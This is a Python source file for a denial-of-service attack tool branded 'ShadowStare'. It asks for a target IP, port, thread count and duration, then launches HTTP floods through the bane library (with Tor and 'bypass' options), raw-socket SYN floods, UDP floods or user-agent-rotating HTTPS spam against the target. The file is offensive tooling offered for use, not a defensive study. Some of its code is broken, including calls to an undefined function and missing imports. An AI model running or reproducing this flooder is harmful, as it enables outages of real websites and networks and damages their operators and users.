import bane, sys, socket, time, threading, os
from concurrent.futures import ThreadPoolExecutor

if sys.version_info < (3, 0):
    input = raw_input

# Define ANSI color codes for styling
class Colors:
    RESET = '\033[0m'
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;82m'
    BLUE = '\033[38;5;75m'
    YELLOW = '\033[38;5;226m'
    WHITE = '\033[38;5;15m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ITALIC = '\033[3m'
    DARK_GREEN = '\033[38;5;82m'  # Dark green
    Light_purple = '\033[38;5;93m',  # Light purple
    Light_pink = '\033[38;5;129m',  # Light pink
    Orange = '\033[38;5;165m',  # Orange
    Light_red = '\033[38;5;208m'   # Light red

# Gradient effect function
def mor_pembe_gradyan(text):
    gradient_text = ""
    for char_index, char in enumerate(text):
        mor_value = 128 + char_index * 127 // len(text)
        pembe_value = char_index * 255 // len(text)
        gradient_text += f"\033[38;2;{mor_value};0;{pembe_value}m{char}"
    return gradient_text + Colors.RESET

def clear_console():
    """Clear the console based on the operating system."""
    os.system('clear')

def print_method_selection_prompt():
    clear_console()  # Clear the console before showing the prompt
    prompt = """
╔══════════════════════════════════════════════════╗
║                                                  ║
║  Choose Attack Method:                           ║
║                                                  ║
║  1 - Small Attack                                ║
║  2 - Medium Attack                               ║
║  3 - Ultra-high Attack                           ║
║  4 - SYN Flood                                   ║
║  5 - UDP Flood                                   ║
║  6 - HTTPS Spam                                  ║
║                                                  ║
╚══════════════════════════════════════════════════╝
"""
    print(mor_pembe_gradyan(prompt))

def print_banner():
    banner_text = """
                                             ██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░
                                           ▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░
                                           ░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ 
                                             ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ 
                                           ▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ 
                                            ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  
                                            ░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░  
                                            ░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░  
                                              ░   ░  ░  ░      ░  ░   ░        ░ ░      ░    
                                                     ░                                         

                                              >Author: ShadowStare         >Version: 1.0.1A       
    """
    print(mor_pembe_gradyan(banner_text))

def loading_animation(duration):
    chars = "/—\\|"
    for _ in range(duration * 2):
        for char in chars:
            sys.stdout.write(f'\r{Colors.GREEN}Loading {char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 20 + '\r')  # Clear the line
    print(f"{Colors.GREEN}Powered By ShadowStare{Colors.RESET}")

def get_user_input(prompt, valid_condition, error_message):
    while True:
        try:
            value = input(prompt)
            if valid_condition(value):
                return value
        except:
            pass
        print(f"{Colors.RED}{error_message}{Colors.RESET}\n")

def get_numeric_input(prompt, min_value, max_value):
    return int(get_user_input(
        prompt,
        lambda x: min_value <= int(x) <= max_value,
        f"Please enter a valid choice between {min_value} and {max_value}."
    ))

def get_choice_input(prompt, choices):
    return get_user_input(
        prompt,
        lambda x: x.lower() in choices,
        f"Please enter a valid choice: {', '.join(choices)}."
    ).lower()

def login():
    valid_username = "admin"
    valid_password = "admin"

    print_banner()
    print(f"{Colors.GREEN}Welcome! Please log in to continue.{Colors.RESET}\n")
    username = get_user_input(
        f"{Colors.DARK_GREEN}Username: {Colors.WHITE}",
        lambda x: x == valid_username,
        f"{Colors.RED}Invalid username.{Colors.RESET}"
    )
    password = get_user_input(
        f"{Colors.DARK_GREEN}Password: {Colors.WHITE}",
        lambda x: x == valid_password,
        f"{Colors.RED}Invalid password.{Colors.RESET}"
    )

    print(f"{Colors.GREEN}Login successful!{Colors.RESET}\n")
    loading_animation(3)

# Main program starts here
clear_console()  # Clear the console before asking for the target IP
login()

# Print the banner
clear_console()  # Clear the console before showing the prompt
print_banner()

# Get target IP address
target = get_user_input(
    mor_pembe_gradyan("Target IP address: "),
    lambda x: socket.gethostbyname(x),
    f"{Colors.RED}Please enter a valid IP address.{Colors.RESET}"
)

print()

# Get port number
port = get_numeric_input(
    mor_pembe_gradyan("Port (number between 1 - 65535): "),
    1, 65535
)

print()

# Get number of threads
threads_count = get_numeric_input(
    mor_pembe_gradyan("Number of threads (1 - 1000): "),
    1, 1000
)

print()

# Get timeout value
timeout = get_numeric_input(
    mor_pembe_gradyan("Timeout (number between 1 - 30): "),
    1, 30
)

print()

# Get attack duration
duration = get_numeric_input(
    mor_pembe_gradyan("Attack duration in seconds (1 - 1000000): "),
    1, 1000000
)

print()

# Check if stressing (Tor) is enabled
tor = get_choice_input(
    mor_pembe_gradyan("Is Stressing enabled? (yes / no): "),
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

print()

# Choose attack method
print_method_selection_prompt()
method = get_numeric_input(
    mor_pembe_gradyan("Choose the attack method (1-6): "),
    1, 6
)

# Add this in the attack method logic
if method == 6:
    target_url = get_user_input(
        mor_pembe_gradyan("Target URL: "),
        lambda x: True,  # Add URL validation if necessary
        f"{Colors.RED}Please enter a valid URL.{Colors.RESET}"
    )
    duration = get_numeric_input(
        mor_pembe_gradyan("Duration in seconds: "),
        1, 1000000
    )
    concurrency = get_numeric_input(
        mor_pembe_gradyan("Concurrency (number of threads): "),
        1, 1000
    )
    https_spam(target_url, duration, concurrency)

print()

# Enable bypass mode
spam_mode = get_choice_input(
    mor_pembe_gradyan("Do you want to enable 'bypass' mode? (yes / no): "),
    ['yes', 'no', 'y', 'n']
) in ['yes', 'y']

# Function to perform HTTPS spam attack
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0'
]

def https_spam(target_url, duration, concurrency):
    endtime = time.time() + duration
    request_count = 0
    
    def make_request():
        nonlocal request_count
        while time.time() <= endtime:
            user_agent = random.choice(user_agents)
            try:
                response = requests.get(target_url, headers={'User-Agent': user_agent})
                request_count += 1
            except requests.RequestException as e:
                print(f"Error making request: {e}")

    threads = []
    for _ in range(concurrency):
        thread = threading.Thread(target=make_request)
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
    print(f"Total requests sent: {request_count}")

# Example of how to call the function
# https_spam('http://example.com', 60, 10)

# Function to perform SYN flood attack
def syn_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    client.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    timeout = time.time() + duration
    while time.time() < timeout:
        ip_header = bane.create_ip_header(target_ip)
        tcp_header = bane.create_tcp_header(target_ip, target_port)
        packet = ip_header + tcp_header
        client.sendto(packet, (target_ip, 0))

# Function to perform UDP flood attack
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = bane.generate_payload(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        client.sendto(payload, (target_ip, target_port))

def print_monitoring_banner():
    clear_console()  # Clear the console before showing the monitoring banner
    banner_text = """
 (     (           (      (                                     
 )\ )  )\ )        )\ )   )\ )    )               )       (     
(()/( (()/(       (()/(  (()/( ( /(    )  (    ( /(   (   )\ )  
 /(_)) /(_))   (   /(_))  /(_)))\())( /(  )(   )\()) ))\ (()/(  
(_))_ (_))_    )\ (_))   (_)) (_))/ )(_))(()\ (_))/ /((_) ((_)) 
 |   \ |   \  ((_)/ __|  / __|| |_ ((_)_  ((_)| |_ (_))   _| |  
 | |) || |) |/ _ \\__ \  \__ \|  _|/ _` || '_||  _|/ -_)/ _` |  
 |___/ |___/ \___/|___/  |___/ \__|\__,_||_|   \__|\___|\__,_|  
                                                                 
    """
    print(mor_pembe_gradyan(banner_text))

def monitor_attack(http_flooder_instance):
    print_monitoring_banner()
    while True:
        try:
            time.sleep(1)
            sys.stdout.write("\r{}Total: {} {}| {}Success => {} {}| {}Fails => {}{}".format(
                Colors.RED,
                http_flooder_instance.counter + http_flooder_instance.fails,
                Colors.RESET,
                Colors.GREEN,
                http_flooder_instance.counter,
                Colors.RESET,
                Colors.RED,
                http_flooder_instance.fails,
                Colors.RESET
            ))
            sys.stdout.flush()
            if http_flooder_instance.done():
                break
        except:
            break

if spam_mode:
    http_flooder_instance = bane.HTTP_Spam(target, p=port, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method)
else:
    if port == 443:
        target = "https://" + target + '/'
    else:
        target = "http://" + target + ':' + str(port) + '/'
    scrape_target = get_choice_input(
        mor_pembe_gradyan("Do you want to scrape the target? (yes / no): "),
        ['yes', 'no', 'y', 'n']
    ) in ['yes', 'y']
    scraped_urls = 1
    if scrape_target:
        scraped_urls = get_numeric_input(
            mor_pembe_gradyan("How many URLs to collect? (between 1 - 20): "),
            1, 20
        )
    http_flooder_instance = bane.HTTP_Puncher(target, timeout=timeout, threads=threads_count, duration=duration, tor=tor, logs=False, method=method, scrape_target=scrape_target, scraped_urls=scraped_urls)

print(bane.Fore.RESET)

# Start the chosen attack method
if method == 4:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(syn_flood, target, port, duration)
elif method == 5:
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(udp_flood, target, port, duration)
else:
    # For HTTP Spam or Puncher attacks
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        for _ in range(threads_count):
            executor.submit(http_flooder_instance.start)

# Monitor the attack
monitor_attack(http_flooder_instance)
